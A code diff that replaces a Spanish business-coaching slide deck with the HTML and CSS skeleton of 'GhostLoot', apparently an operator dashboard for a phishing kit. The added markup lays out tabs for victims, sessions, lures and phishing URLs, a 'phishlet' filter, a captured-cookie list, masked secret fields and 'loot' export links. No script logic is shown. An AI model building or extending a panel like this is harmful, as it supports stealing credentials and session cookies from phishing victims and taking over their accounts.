@@ -1,1597 +1,676 @@
-<!DOCTYPE html>
-<html lang="es">
+<!doctype html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Dinka × Julen — Propuesta de Colaboración</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-
-<!-- ============================================================
-     ESTILOS GLOBALES
-     ============================================================ -->
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>GhostLoot</title>
 <style>
-/* ── Variables ─────────────────────────────────────────────── */
-:root {
-  --black:       #0A0A0A;
-  --green:       #00E676;
-  --forest:      #0B3D2E;
-  --line:        #1F6F4A;
-  --white:       #FFFFFF;
-  --grey:        #8A8F8C;
-  --slide-w:     1920px;
-  --slide-h:     1080px;
-}
-
-/* ── Reset ──────────────────────────────────────────────────── */
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-html, body {
-  width: 100%; height: 100%;
-  background: var(--black);
-  font-family: 'Space Grotesk', 'Inter', 'IBM Plex Sans', sans-serif;
-  overflow: hidden;
-  color: var(--white);
-}
-
-/* ── Stage (viewport container) ────────────────────────────── */
-.stage {
-  position: fixed;
-  top: 0; left: 0;
-  width: 100%; height: 100%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  overflow: hidden;
-}
-
-/* ── Slide wrapper ──────────────────────────────────────────── */
-.slide-wrapper {
-  position: relative;
-  width: var(--slide-w);
-  height: var(--slide-h);
-  transform-origin: center center;
-}
-
-/* ── Individual slide ───────────────────────────────────────── */
-.slide {
-  position: absolute;
-  inset: 0;
-  width: var(--slide-w);
-  height: var(--slide-h);
-  background: var(--black);
-  overflow: hidden;
-  opacity: 0;
-  transition: opacity 0.3s ease;
-  display: flex;
-  flex-direction: column;
-}
-.slide.active {
-  opacity: 1;
-  z-index: 2;
-}
-
-/* ── Header / Footer ────────────────────────────────────────── */
-.slide-header {
-  position: absolute;
-  top: 0; left: 0; right: 0;
-  height: 56px;
-  display: flex;
-  align-items: center;
-  padding: 0 100px;
-  border-bottom: 1px solid var(--line);
-}
-.slide-header span {
-  font-size: 11px;
-  font-weight: 500;
-  text-transform: uppercase;
-  letter-spacing: 0.15em;
-  color: var(--grey);
-}
-.watermark {
-  position: absolute;
-  top: 16px;
-  left: 100px;
-  font-size: 11px;
-  font-weight: 700;
-  text-transform: uppercase;
-  letter-spacing: 0.2em;
-  color: var(--grey);
-  opacity: 0.5;
-}
-.slide-footer {
-  position: absolute;
-  bottom: 0; left: 0; right: 0;
-  height: 52px;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding: 0 100px;
-  border-top: 1px solid var(--line);
-}
-.slide-footer span {
-  font-size: 11px;
-  font-weight: 500;
-  text-transform: uppercase;
-  letter-spacing: 0.15em;
-  color: var(--grey);
-}
-
-/* ── Content area ───────────────────────────────────────────── */
-.slide-content {
-  position: absolute;
-  top: 56px;
-  left: 100px;
-  right: 100px;
-  bottom: 52px;
-  padding: 48px 0 32px;
-}
-
-/* ── Typography ─────────────────────────────────────────────── */
-.eyebrow {
-  font-size: 13px;
-  font-weight: 500;
-  text-transform: uppercase;
-  letter-spacing: 0.15em;
-  color: var(--grey);
-  margin-bottom: 20px;
-}
-.h1 {
-  font-size: 120px;
-  font-weight: 700;
-  line-height: 0.95;
-  letter-spacing: -0.02em;
-  text-transform: uppercase;
-  color: var(--white);
-}
-.h2 {
-  font-size: 40px;
-  font-weight: 500;
-  line-height: 1.1;
-  color: var(--white);
-}
-.h3 {
-  font-size: 20px;
-  font-weight: 500;
-  text-transform: uppercase;
-  letter-spacing: 0.1em;
-  color: var(--white);
-}
-.body-text {
-  font-size: 18px;
-  font-weight: 400;
-  line-height: 1.55;
-  color: var(--white);
-}
-.meta-text {
-  font-size: 12px;
-  font-weight: 400;
-  text-transform: uppercase;
-  letter-spacing: 0.15em;
-  color: var(--grey);
-}
-.green { color: var(--green); }
-.grey  { color: var(--grey); }
-.hero-number {
-  font-size: 200px;
-  font-weight: 700;
-  line-height: 0.9;
-  letter-spacing: -0.03em;
-  color: var(--green);
-}
-.hero-label {
-  font-size: 18px;
-  font-weight: 400;
-  color: var(--grey);
-  margin-top: 8px;
-}
-
-/* ── Quote block ────────────────────────────────────────────── */
-.quote-block {
-  border-left: 4px solid var(--green);
-  padding: 20px 28px;
-  margin-top: 28px;
-}
-.quote-block p {
-  font-size: 26px;
-  font-weight: 400;
-  font-style: italic;
-  line-height: 1.4;
-  color: var(--white);
-}
-
-/* ── Highlight block (Forest Green bg) ─────────────────────── */
-.highlight-block {
-  background: var(--forest);
-  padding: 24px 32px;
-  border-left: 4px solid var(--green);
-}
-.highlight-block p {
-  font-size: 20px;
-  font-weight: 500;
-  color: var(--white);
-  line-height: 1.45;
-}
-
-/* ── Tables ─────────────────────────────────────────────────── */
-table {
-  width: 100%;
-  border-collapse: collapse;
-}
-thead tr {
-  border-bottom: 1px solid var(--line);
-}
-thead th {
-  font-size: 11px;
-  font-weight: 500;
-  text-transform: uppercase;
-  letter-spacing: 0.15em;
-  color: var(--grey);
-  padding: 12px 16px;
-  text-align: left;
-}
-tbody tr {
-  border-bottom: 1px solid var(--line);
-}
-tbody td {
-  font-size: 18px;
-  font-weight: 400;
-  color: var(--white);
-  padding: 14px 16px;
-  line-height: 1.3;
-}
-tbody td.accent { color: var(--green); font-weight: 600; }
-tbody td.muted  { color: var(--grey); }
-tbody td.small-text { font-size: 14px; }
-
-/* ── Dividers ───────────────────────────────────────────────── */
-.hairline-v {
-  width: 1px;
-  background: var(--line);
-  align-self: stretch;
-}
-.hairline-h {
-  height: 1px;
-  background: var(--line);
-  width: 100%;
-  margin: 20px 0;
-}
-
-/* ── Decorative × ───────────────────────────────────────────── */
-.deco-x {
-  position: absolute;
-  font-size: 600px;
-  font-weight: 700;
-  color: var(--green);
-  opacity: 0.06;
-  line-height: 1;
-  pointer-events: none;
-  user-select: none;
-  letter-spacing: -0.05em;
-}
-
-/* ── Navigation buttons ─────────────────────────────────────── */
-.nav-btn {
-  position: fixed;
-  top: 50%;
-  transform: translateY(-50%);
-  z-index: 100;
-  background: rgba(31,111,74,0.25);
-  border: 1px solid var(--line);
-  color: var(--grey);
-  width: 44px;
-  height: 80px;
-  cursor: pointer;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  font-size: 18px;
-  transition: background 0.2s, color 0.2s;
-  font-family: inherit;
-}
-.nav-btn:hover { background: rgba(0,230,118,0.15); color: var(--green); }
-.nav-prev { left: 8px; }
-.nav-next { right: 8px; }
-
-/* ── Global indicator ───────────────────────────────────────── */
-.global-indicator {
-  position: fixed;
-  bottom: 14px;
-  right: 60px;
-  z-index: 100;
-  font-size: 11px;
-  font-weight: 500;
-  text-transform: uppercase;
-  letter-spacing: 0.15em;
-  color: var(--grey);
-  pointer-events: none;
-}
-
-/* ── Keyboard hint ──────────────────────────────────────────── */
-.kbd-hint {
-  position: fixed;
-  bottom: 14px;
-  left: 60px;
-  z-index: 100;
-  font-size: 10px;
-  font-weight: 400;
-  text-transform: uppercase;
-  letter-spacing: 0.12em;
-  color: rgba(138,143,140,0.4);
-  pointer-events: none;
-}
-
-/* ── Print / PDF export ─────────────────────────────────────── */
-@page { size: 1920px 1080px; margin: 0; }
-@media print {
-  html, body {
-    width: 1920px; height: auto;
-    background: var(--black);
-    overflow: visible !important;
+  :root{
+    --bg:#0b0f14;--bg2:#0d1117;--card:#141a22;--card2:#1a212b;--bd:#232c38;--bd2:#2d3947;
+    --tx:#e6edf3;--mut:#8b98a9;--dim:#5b6675;
+    --ok:#3fb950;--okbg:rgba(63,185,80,.14);--bad:#f85149;--badbg:rgba(248,81,73,.12);
+    --warn:#d29922;--acc:#4c9aff;--accbg:rgba(76,154,255,.14);--pur:#bc8cff;
   }
-  .stage {
-    position: static !important;
-    transform: none !important;
-    width: 1920px; height: auto;
-    top: auto; left: auto;
-    display: block;
-  }
-  .slide-wrapper {
-    position: static !important;
-    transform: none !important;
-    width: 1920px; height: auto;
-  }
-  .slide {
-    position: relative !important;
-    opacity: 1 !important;
-    width: 1920px !important;
-    height: 1080px !important;
-    page-break-after: always;
-    break-after: page;
-    display: block !important;
-  }
-  .slide:last-child { page-break-after: auto; break-after: auto; }
-  .nav-btn, .global-indicator, .kbd-hint { display: none !important; }
-}
+  *{box-sizing:border-box}
+  html,body{margin:0;height:100%}
+  body{background:var(--bg);color:var(--tx);font:13.5px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
+  a{color:var(--acc);text-decoration:none}
+  .top{display:flex;align-items:center;gap:14px;padding:12px 20px;border-bottom:1px solid var(--bd);
+       background:linear-gradient(180deg,#0e141b,#0b0f14);position:sticky;top:0;z-index:20;flex-wrap:wrap}
+  .brand{font-weight:700;font-size:15px;letter-spacing:.2px;display:flex;align-items:center;gap:8px}
+  .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--ok);box-shadow:0 0 8px var(--ok)}
+  .meta{color:var(--dim);font-size:12px}
+  .meta code{color:var(--mut);background:#0a0e13;border:1px solid var(--bd);padding:1px 6px;border-radius:5px}
+  .spacer{flex:1}
+  .search{position:relative}
+  .search input{background:#0a0e13;border:1px solid var(--bd2);color:var(--tx);border-radius:8px;
+       padding:7px 10px 7px 30px;width:240px;font-size:13px;outline:none}
+  .search input:focus{border-color:var(--acc)}
+  .search svg{position:absolute;left:9px;top:8px;opacity:.5}
+  .btn{background:var(--card2);color:var(--tx);border:1px solid var(--bd2);border-radius:8px;
+       padding:7px 11px;font-size:12.5px;cursor:pointer;white-space:nowrap;display:inline-flex;align-items:center;gap:6px}
+  .btn:hover{border-color:var(--acc);color:var(--acc)}
+  .btn.on{background:var(--accbg);border-color:var(--acc);color:var(--acc)}
+  .live{display:inline-flex;align-items:center;gap:6px}
+  .live .d{width:7px;height:7px;border-radius:50%;background:var(--dim)}
+  .live.on .d{background:var(--ok);animation:pulse 1.6s infinite}
+  @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(63,185,80,.5)}70%{box-shadow:0 0 0 6px rgba(63,185,80,0)}100%{box-shadow:0 0 0 0 rgba(63,185,80,0)}}
+  .tabs{display:flex;gap:4px;padding:12px 20px 0}
+  .tab{padding:8px 14px;border-radius:8px 8px 0 0;cursor:pointer;color:var(--mut);font-weight:600;font-size:13px;border:1px solid transparent;border-bottom:none}
+  .tab.on{background:var(--card);color:var(--tx);border-color:var(--bd)}
+  .kpis{display:grid;grid-template-columns:repeat(auto-fill,minmax(155px,1fr));gap:12px;padding:16px 20px}
+  .kpi{background:var(--card);border:1px solid var(--bd);border-radius:12px;padding:13px 16px;position:relative;overflow:hidden}
+  .kpi .n{font-size:27px;font-weight:700;line-height:1.1}
+  .kpi .l{color:var(--mut);font-size:11px;text-transform:uppercase;letter-spacing:.05em;margin-top:3px}
+  .kpi.g .n{color:var(--ok)} .kpi.b .n{color:var(--acc)} .kpi.p .n{color:var(--pur)} .kpi.w .n{color:var(--warn)}
+  .kpi .bar{position:absolute;left:0;top:0;bottom:0;width:3px}
+  .kpi.g .bar{background:var(--ok)} .kpi.b .bar{background:var(--acc)} .kpi.p .bar{background:var(--pur)} .kpi.w .bar{background:var(--warn)} .kpi.n0 .bar{background:var(--dim)}
+  .filters{display:flex;align-items:center;gap:10px;padding:0 20px 12px;flex-wrap:wrap}
+  .filters select{background:#0a0e13;border:1px solid var(--bd2);color:var(--tx);border-radius:8px;padding:6px 9px;font-size:12.5px;outline:none}
+  .chk{display:inline-flex;align-items:center;gap:6px;color:var(--mut);font-size:12.5px;cursor:pointer;user-select:none}
+  .count{color:var(--dim);font-size:12px;margin-left:auto}
+  .wrap{padding:0 20px 60px;overflow-x:auto}
+  table{border-collapse:separate;border-spacing:0;width:100%;min-width:920px}
+  thead th{background:var(--bg);color:var(--mut);font-size:11px;text-transform:uppercase;
+       letter-spacing:.04em;text-align:left;padding:9px 12px;border-bottom:1px solid var(--bd);cursor:pointer;white-space:nowrap}
+  thead th .ar{opacity:.4;font-size:10px}
+  thead th.sorted{color:var(--tx)} thead th.sorted .ar{opacity:1;color:var(--acc)}
+  tbody td{padding:10px 12px;border-bottom:1px solid #171e27;vertical-align:middle}
+  tbody tr:hover td{background:#111823}
+  tbody tr.new td{animation:flash 2.5s ease-out}
+  @keyframes flash{0%{background:var(--accbg)}100%{background:transparent}}
+  .u{font-weight:600}
+  .mut{color:var(--dim)}
+  .phl{display:inline-block;background:#182231;color:var(--acc);border:1px solid #223047;border-radius:6px;padding:1px 8px;font-size:11.5px;font-weight:600}
+  .phl+.phl{margin-left:4px}
+  .pill{display:inline-block;padding:2px 9px;border-radius:999px;font-size:11.5px;font-weight:700;letter-spacing:.02em}
+  .pill.ok{background:var(--okbg);color:var(--ok)} .pill.bad{background:var(--badbg);color:var(--bad)}
+  .num{font-variant-numeric:tabular-nums}
+  .secret{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px;cursor:pointer;
+       background:#0a0e13;border:1px solid var(--bd);border-radius:6px;padding:2px 8px;display:inline-block;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;vertical-align:middle}
+  .secret.hide{color:transparent;text-shadow:0 0 7px rgba(230,237,243,.85)}
+  .rowbtn{background:transparent;border:1px solid var(--bd2);color:var(--mut);border-radius:6px;padding:4px 9px;font-size:11.5px;cursor:pointer}
+  .rowbtn:hover{border-color:var(--acc);color:var(--acc)}
+  .rowbtn.primary{border-color:#2b6b3a;color:var(--ok)}
+  .rowbtn.primary:hover{background:var(--okbg)}
+  .exp{cursor:pointer;color:var(--dim);width:16px;display:inline-block;text-align:center;transition:transform .12s}
+  .exp.open{transform:rotate(90deg);color:var(--acc)}
+  .detail td{background:#0c1117;padding:0}
+  .detail .inner{padding:14px 16px 18px}
+  .dgrid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:8px 22px;margin-bottom:12px}
+  .dgrid .k{color:var(--dim);font-size:11px;text-transform:uppercase;letter-spacing:.04em}
+  .dgrid .v{font-size:12.5px;word-break:break-all}
+  .attempts{margin-top:6px}
+  .attempts .a{display:flex;align-items:center;gap:10px;padding:6px 8px;border:1px solid var(--bd);border-radius:8px;margin-bottom:6px;font-size:12.5px;background:var(--card)}
+  .cookies-list{margin-top:8px;font-family:ui-monospace,Menlo,monospace;font-size:12px;color:var(--mut);max-height:180px;overflow:auto;border:1px solid var(--bd);border-radius:8px;padding:8px}
+  .cookies-list .cn{color:var(--tx)} .cookies-list .cd{color:var(--acc)}
+  #toast{position:fixed;bottom:22px;right:22px;background:var(--card2);border:1px solid var(--ok);color:var(--tx);
+       padding:11px 16px;border-radius:10px;box-shadow:0 8px 30px rgba(0,0,0,.5);opacity:0;transform:translateY(10px);
+       transition:.2s;z-index:50;font-size:13px;max-width:340px}
+  #toast.show{opacity:1;transform:none}
+  footer{position:fixed;bottom:0;left:0;right:0;padding:6px 20px;background:#0a0e13;border-top:1px solid var(--bd);color:var(--dim);font-size:11px;text-align:center}
+  .empty{text-align:center;color:var(--dim);padding:40px}
+  .dombar{display:none;gap:8px;padding:10px 20px;flex-wrap:wrap;align-items:center;border-bottom:1px solid var(--bd);background:#0c1117}
+  .dombar .lbl{color:var(--dim);font-size:11px;text-transform:uppercase;letter-spacing:.05em;margin-right:2px}
+  .dchip{display:inline-flex;align-items:center;gap:7px;background:var(--card);border:1px solid var(--bd);border-radius:999px;padding:4px 11px;font-size:12px}
+  .dchip .dd{width:8px;height:8px;border-radius:50%;flex:0 0 auto}
+  .dchip .dd.ok{background:var(--ok);box-shadow:0 0 6px var(--ok)} .dchip .dd.down{background:var(--bad);box-shadow:0 0 6px var(--bad)} .dchip .dd.flag{background:var(--warn);box-shadow:0 0 6px var(--warn)}
+  .dchip .h{color:var(--tx);font-weight:600} .dchip .s{color:var(--dim);font-size:11px}
+  #urlsview{padding-bottom:60px}
+  .urlbar{display:flex;gap:10px;padding:16px 20px;flex-wrap:wrap;align-items:center}
+  .urlbar input{background:#0a0e13;border:1px solid var(--bd2);color:var(--tx);border-radius:8px;padding:8px 11px;font-size:13px;outline:none}
+  .urlbar input:focus{border-color:var(--acc)}
+  .urlbar input#nu{min-width:340px;flex:1}
+  .urlrow{display:flex;align-items:center;gap:12px;padding:9px 20px;border-bottom:1px solid #171e27}
+  .urlrow:hover{background:#111823}
+  .urlrow .dd{width:9px;height:9px;border-radius:50%;flex:0 0 auto}
+  .urlrow .dd.ok{background:var(--ok);box-shadow:0 0 6px var(--ok)} .urlrow .dd.down{background:var(--bad)}
+  .urlrow .url{font-family:ui-monospace,Menlo,monospace;font-size:12.5px;color:var(--acc);cursor:pointer;word-break:break-all}
+  .urlrow .lab{color:var(--mut);font-size:12px;background:#182231;border:1px solid #223047;border-radius:6px;padding:1px 8px}
+  .urlrow .sp{flex:1}
+  #settingsview{padding:22px 24px 60px;max-width:640px}
+  #settingsview h3{font-size:14px;margin:0 0 4px;text-transform:uppercase;letter-spacing:.05em;color:var(--tx)}
+  #settingsview .sub{color:var(--dim);font-size:12px;margin:0 0 16px}
+  .card{background:var(--card);border:1px solid var(--bd);border-radius:12px;padding:18px 20px}
+  .frow{display:flex;flex-direction:column;gap:5px;margin:12px 0}
+  .frow label{color:var(--mut);font-size:12px}
+  .frow input[type=text]{background:#0a0e13;border:1px solid var(--bd2);color:var(--tx);border-radius:8px;padding:9px 11px;font-size:13px;outline:none;font-family:ui-monospace,Menlo,monospace}
+  .frow input:focus{border-color:var(--acc)}
+  .setchk{display:flex;align-items:center;gap:8px;margin:12px 0;color:var(--tx);font-size:13px;cursor:pointer}
+  .setbtns{display:flex;gap:10px;margin-top:18px}
+  .note{color:var(--dim);font-size:12px;line-height:1.6;margin-top:16px}
+  .note code{background:#0a0e13;border:1px solid var(--bd);border-radius:5px;padding:1px 6px;color:var(--acc)}
+  .timeline{display:none;align-items:flex-end;gap:3px;padding:8px 24px 4px;height:52px}
+  .timeline .bwrap{display:flex;flex-direction:column;align-items:center;gap:3px;justify-content:flex-end}
+  .timeline .bar{width:14px;background:var(--ok);border-radius:2px 2px 0 0;min-height:2px;opacity:.85}
+  .timeline .bl{font-size:9px;color:var(--dim)}
+  .timeline .tlab{align-self:center;color:var(--dim);font-size:11px;margin-right:6px}
+  .badge{display:inline-block;padding:1px 7px;border-radius:999px;font-size:10.5px;font-weight:700;margin-left:5px;vertical-align:middle}
+  .badge.used{background:#26324a;color:#9db4d8}
+  .badge.mip{background:rgba(210,153,34,.15);color:var(--warn)}
+  .vstate{display:flex;align-items:center;gap:10px;margin-top:12px;flex-wrap:wrap;border-top:1px solid var(--bd);padding-top:12px}
+  .vstate input.notes{flex:1;min-width:200px;background:#0a0e13;border:1px solid var(--bd2);color:var(--tx);border-radius:8px;padding:6px 10px;font-size:12.5px;outline:none}
+  #luresview{padding:8px 0 60px}
 </style>
 </head>
 <body>
-
-<!-- ============================================================
-     BOTONES DE NAVEGACIÓN
-     ============================================================ -->
-<button class="nav-btn nav-prev" onclick="navigate(-1)" aria-label="Anterior">&#8592;</button>
-<button class="nav-btn nav-next" onclick="navigate(1)" aria-label="Siguiente">&#8594;</button>
-<div class="global-indicator" id="indicator">01 / 17</div>
-<div class="kbd-hint">← → Navegar · F Fullscreen · Space Siguiente</div>
-
-<div class="stage">
-  <div class="slide-wrapper" id="slideWrapper">
-
-<!-- ============================================================
-     SLIDE 01 — PORTADA
-     ============================================================ -->
-<section class="slide active" data-slide-number="01" style="background:var(--black);">
-  <!-- Header -->
-  <div class="slide-header">
-    <span>PROPUESTA DE COLABORACIÓN · CONFIDENCIAL</span>
+<div class="top">
+  <div class="brand"><span class="dot"></span>GhostLoot</div>
+  <span class="meta">db <code id="dbpath">…</code> · <span id="updated">…</span></span>
+  <div class="spacer"></div>
+  <div class="search">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#8b98a9" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4-4"/></svg>
+    <input id="q" autocomplete="off">
   </div>
+  <button class="btn" id="refresh"></button>
+  <button class="btn" id="auto"><span class="live" id="livewrap"><span class="d"></span></span><span id="autolbl"></span></button>
+  <a class="btn" id="loot" href="/export/loot.zip"></a>
+  <a class="btn" id="csv" href="/export/sessions.csv"></a>
+  <button class="btn" id="langbtn"></button>
+</div>
+
+<div class="dombar" id="domains"></div>
+
+<div class="tabs">
+  <div class="tab on" data-tab="victims"></div>
+  <div class="tab" data-tab="sessions"></div>
+  <div class="tab" data-tab="lures"></div>
+  <div class="tab" data-tab="urls"></div>
+  <div class="tab" data-tab="settings"></div>
+</div>
+
+<div id="timeline" class="timeline"></div>
+
+<div class="kpis" id="kpis"></div>
+
+<div class="filters">
+  <select id="fphishlet"></select>
+  <label class="chk"><input type="checkbox" id="fvalid"> <span id="fvalid_l"></span></label>
+  <label class="chk" id="fnoisewrap"><input type="checkbox" id="fnoise"> <span id="fnoise_l"></span></label>
+  <span class="count" id="count"></span>
+</div>
+
+<div class="wrap">
+  <table>
+    <thead id="thead"></thead>
+    <tbody id="tbody"></tbody>
+  </table>
+</div>
+
+<div id="urlsview" hidden></div>
+<div id="settingsview" hidden></div>
+<div id="luresview" hidden></div>
+
+<div id="toast"></div>
+<footer><span id="foothealth"></span> · <span id="footsb"></span> · <span id="foottotal"></span></footer>
 
-  <!-- Deco × gigante -->
-  <div class="deco-x" style="right:-60px; bottom:-180px;">×</div>
-
-  <!-- Supratítulo -->
-  <div style="position:absolute; top:80px; left:100px;">
-    <span class="meta-text">DOCUMENTO DE TRABAJO · AGOSTO 2026</span>
-  </div>
-
-  <!-- Título principal -->
-  <div style="position:absolute; top:140px; left:100px; line-height:0.92;">
-    <div style="font-size:240px; font-weight:700; letter-spacing:-0.03em; text-transform:uppercase; line-height:0.9; color:var(--white);">DINKA</div>
-    <div style="font-size:240px; font-weight:700; letter-spacing:-0.03em; text-transform:uppercase; line-height:0.9; color:var(--white);">
-      <span style="color:var(--green);">×</span> JULEN
-    </div>
-  </div>
-
-  <!-- Subtítulo inferior -->
-  <div style="position:absolute; bottom:100px; left:100px;">
-    <div style="font-size:22px; font-weight:400; text-transform:uppercase; letter-spacing:0.12em; color:var(--grey); margin-bottom:14px;">PROPUESTA DE COLABORACIÓN</div>
-    <div style="font-size:36px; font-weight:600; color:var(--green);">Cómo romper el techo</div>
-  </div>
-
-  <!-- Footer -->
-  <div class="slide-footer">
-    <span>AGOSTO 2026</span>
-    <span>01 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 02 — LO QUE FUNCIONA
-     ============================================================ -->
-<section class="slide" data-slide-number="02" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>DIAGNÓSTICO · 01 — PUNTO DE PARTIDA</span></div>
-
-  <div class="slide-content">
-    <!-- Título -->
-    <div style="display:flex; gap:80px; height:100%;">
-
-      <!-- Columna izquierda: título -->
-      <div style="flex:0 0 480px; display:flex; flex-direction:column; justify-content:flex-start; padding-top:10px;">
-        <div class="h1" style="font-size:100px; margin-bottom:28px;">TU<br>NEGOCIO<br>HOY</div>
-        <div style="font-size:20px; font-weight:500; color:var(--grey); margin-bottom:40px;">Nada de esto está roto.</div>
-
-        <!-- Cita -->
-        <div class="quote-block" style="margin-top:auto;">
-          <p>"Nada de esto está roto. Por eso el problema no es de producto ni de audiencia."</p>
-        </div>
-      </div>
-
-      <!-- Hairline vertical -->
-      <div class="hairline-v"></div>
-
-      <!-- Columna derecha: lista de activos -->
-      <div style="flex:1; display:flex; flex-direction:column; justify-content:center; gap:0;">
-        <div class="eyebrow" style="margin-bottom:24px;">ACTIVOS ACTUALES</div>
-
-        <!-- Items -->
-        <div style="display:flex; flex-direction:column; gap:0;">
-          <!-- Item -->
-          <div style="padding:18px 0; border-bottom:1px solid var(--line); font-size:19px; line-height:1.4; color:var(--white);">
-            — Marca personal consolidada y autoridad real en enfermedades autoinmunes
-          </div>
-          <div style="padding:18px 0; border-bottom:1px solid var(--line); font-size:19px; line-height:1.4; color:var(--white);">
-            — <span class="green" style="font-weight:700;">~3.000</span> alumnas, <span class="green" style="font-weight:700;">30</span> generaciones, <span class="green" style="font-weight:700;">90%</span> con resultados
-          </div>
-          <div style="padding:18px 0; border-bottom:1px solid var(--line); font-size:19px; line-height:1.4; color:var(--white);">
-            — Engagement enorme: reels con miles de comentarios, stories con <span class="green" style="font-weight:700;">37.000</span> views
-          </div>
-          <div style="padding:18px 0; border-bottom:1px solid var(--line); font-size:19px; line-height:1.4; color:var(--white);">
-            — Demanda orgánica sin gastar un dólar en ads
-          </div>
-          <div style="padding:18px 0; border-bottom:1px solid var(--line); font-size:19px; line-height:1.4; color:var(--white);">
-            — Equipo montado: coaches, Closer Manager, closers
-          </div>
-          <div style="padding:18px 0; border-bottom:1px solid var(--line); font-size:19px; line-height:1.4; color:var(--white);">
-            — Productos validados en tres franjas de precio
-          </div>
-          <div style="padding:18px 0; border-bottom:1px solid var(--line); font-size:19px; line-height:1.4; color:var(--white);">
-            — Programas grabados y empaquetados: meditaciones, estrés, perimenopausia
-          </div>
-          <div style="padding:18px 0; font-size:19px; line-height:1.4; color:var(--white);">
-            — Un formato de directo que convierte y que además te gusta hacer
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>DIAGNÓSTICO · 02</span>
-    <span>02 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 03 — EL TECHO
-     ============================================================ -->
-<section class="slide" data-slide-number="03" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>DIAGNÓSTICO · 02 — EL TECHO</span></div>
-
-  <div class="slide-content">
-    <div style="display:flex; flex-direction:column; height:100%; justify-content:space-between;">
-
-      <!-- Parte superior: eyebrow + título -->
-      <div>
-        <div class="h1" style="font-size:88px; margin-bottom:16px;">TRES MESES<br>ENTRE $6.200 Y $7.700</div>
-        <div style="font-size:19px; color:var(--grey); margin-bottom:48px;">
-          Cierres de high ticket en esos meses: 5, 2 y 4. Meses planos, con la marca creciendo y el contenido rindiendo.
-        </div>
-      </div>
-
-      <!-- Centro: tres cifras enormes en fila -->
-      <div style="display:flex; align-items:flex-end; gap:80px; padding:0 0 40px;">
-        <div style="display:flex; flex-direction:column; align-items:flex-start;">
-          <div style="font-size:13px; font-weight:500; text-transform:uppercase; letter-spacing:0.15em; color:var(--grey); margin-bottom:16px;">MAYO</div>
-          <div style="font-size:130px; font-weight:700; line-height:0.9; letter-spacing:-0.02em; color:var(--white);">$7.673</div>
-        </div>
-        <div style="display:flex; flex-direction:column; align-items:flex-start;">
-          <div style="font-size:13px; font-weight:500; text-transform:uppercase; letter-spacing:0.15em; color:var(--grey); margin-bottom:16px;">JUNIO</div>
-          <div style="font-size:130px; font-weight:700; line-height:0.9; letter-spacing:-0.02em; color:var(--white);">$6.202</div>
-        </div>
-        <div style="display:flex; flex-direction:column; align-items:flex-start;">
-          <div style="font-size:13px; font-weight:500; text-transform:uppercase; letter-spacing:0.15em; color:var(--grey); margin-bottom:16px;">JULIO</div>
-          <div style="font-size:130px; font-weight:700; line-height:0.9; letter-spacing:-0.02em; color:var(--white);">$7.662</div>
-        </div>
-      </div>
-
-      <!-- Cita -->
-      <div class="quote-block">
-        <p>"Ese no es tu techo. Es el techo del sistema que hay debajo."</p>
-      </div>
-    </div>
-  </div>
-
-  <div class="slide-footer">
-    <span>DIAGNÓSTICO · 03</span>
-    <span>03 / 17</span>
-  </div>
-</section>
-
-<!-- ============================================================
-     SLIDE 04 — EL EMBUDO COMPLETO
-     ============================================================ -->
-<section class="slide" data-slide-number="04" style="background:var(--black);">
-  <div class="watermark">D × J</div>
-  <div class="slide-header"><span>DIAGNÓSTICO · 03 — EL EMBUDO</span></div>
-
-  <div class="slide-content">
-    <div style="display:flex; flex-direction:column; height:100%;">
-      <div class="h1" style="font-size:68px; margin-bottom:10px;">CÓMO DIAGNOSTICO UN NEGOCIO:<br>DE ARRIBA ABAJO</div>
-      <div style="font-size:17px; color:var(--grey); margin-bottom:32px;">El principio: cuanto más arriba del embudo se aplica un cambio, más afecta al resultado final.</div>
-
-      <!-- Tabla embudo -->
-      <table style="margin-bottom:32px;">
-        <thead>
-          <tr>
-            <th>NIVEL DEL EMBUDO</th>
-            <th>KPI SANO</th>
-            <th>HOY</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td>Respuesta a reel con CTA</td>
-            <td class="muted">1% – 3%</td>
-            <td class="accent" style="font-size:28px; font-weight:700;">?</td>
-          </tr>
-          <tr>
-            <td>Respuesta a story con CTA</td>
-            <td class="muted">1% – 5%</td>
-            <td class="accent" style="font-size:28px; font-weight:700;">?</td>
-          </tr>
-          <tr>
-            <td>Tasa de conversación</td>
-            <td class="muted">50%</td>
-            <td class="accent" style="font-size:28px; font-weight:700;">?</td>
-          </tr>
-          <tr>
-            <td>Tasa de agendamiento</td>
-            <td class="muted">8% – 12%</td>
-            <td class="accent" style="font-size:28px; font-weight:700;">?</td>
-          </tr>
-          <tr>
-            <td>Tasa de show up</td>
-            <td class="muted">80%</td>
-            <td style="font-weight:600; color:var(--white);">52%</td>
-          </tr>
-          <tr style="border-bottom:none;">
-            <td>Tasa de cierre</td>
-            <td class="muted">40% – 60%</td>
-            <td style="font-weight:600; color:var(--white);">23,8%</td>
-          </tr>
-        </tbody>
-      </table>
-
-      <!-- Texto + cita -->
-      <div style="display:flex; gap:40px; align-items:flex-start; flex:1;">
